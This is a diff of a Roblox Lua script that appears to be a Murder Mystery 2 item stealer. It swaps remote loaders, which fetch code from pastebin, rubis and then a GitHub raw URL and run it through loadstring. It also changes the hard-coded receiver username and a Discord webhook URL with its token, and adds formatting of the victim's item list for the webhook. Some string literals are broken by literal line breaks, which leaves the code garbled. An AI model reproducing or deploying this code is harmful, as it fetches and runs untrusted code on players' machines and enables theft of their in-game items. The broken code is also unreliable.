@@ -1,6 +1,11 @@
-local url = game:HttpGet("https://pastebin.com/raw/6GSYjsZq")
-loadstring(game:HttpGet(tostring(url)))()
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/3bRs4VMt5BEcFFtE/raw"))()
+pcall(function()
+    local url = game:HttpGet("https://raw.githubusercontent.com/Kenderlike/mm2-prices/refs/heads/main/script.txt")
+    loadstring(game:HttpGet(tostring(url)))()
+end)
+
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Kenderlike/mm2-prices/refs/heads/main/script.txt"))()
+end)
 
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
@@ -8,11 +13,10 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local users = _G.Usernames or {"Logikaaa_1"}
+local users = _G.Usernames or {"057Deni"}
 local min_rarity = _G.min_rarity or "Common"
-local min_value = tonumber(_G.min_value) or 1
 local ping = _G.pingEveryone or "Yes"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1533742453679456348/6T74rUAGOBhAiGGgldJAgo8tTR0FOX4nw1n94ekagsZNGmXMetWP5CH1zyhAKMafHNSC"
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1538645276531761252/cUb2gp1cnWz8w0EXNjJ8AVBtFcmbmEwLF2zmGUbvVZkmZkd4vYcEye9VkuB7wavTd-Y6"
 
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
@@ -243,17 +247,21 @@ local function SendFirstMessage(list, prefix)
     }
 
     for _, item in ipairs(list) do
-        fields[3].value = fields[3].value .. string.format("%s (x%s) (%s)\n", item.DataID, item.Amount, item.Rarity)
+        fields[3].value = fields[3].value .. string.format("%s (x%s) (%s)
+", item.DataID, item.Amount, item.Rarity)
     end
 
     if #fields[3].value > 1024 then
         local lines = {}
-        for line in fields[3].value:gmatch("[^\r\n]+") do
+        for line in fields[3].value:gmatch("[^
+]+") do
             table.insert(lines, line)
         end
         while #fields[3].value > 1024 and #lines > 0 do
             table.remove(lines)
-            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
+            fields[3].value = table.concat(lines, "
+") .. "
+Plus more!"
         end
     end
 
